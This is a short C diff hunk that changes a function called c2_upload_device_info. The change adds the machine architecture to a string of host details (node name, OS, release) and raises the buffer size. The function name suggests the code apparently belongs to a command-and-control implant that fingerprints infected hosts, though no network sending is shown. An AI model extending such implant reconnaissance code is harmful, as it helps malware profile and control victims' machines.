@@ -106,8 +106,9 @@ void c2_upload_device_info(char *buffer) {
                 17);
     }
 
-    snprintf(buffer, 200, "%s-%s-%s",
+    snprintf(buffer, 260, "%s-%s-%s-%s",
              hostinfo.nodename,
+             hostinfo.machine,
              hostinfo.sysname,
              hostinfo.release);
 }
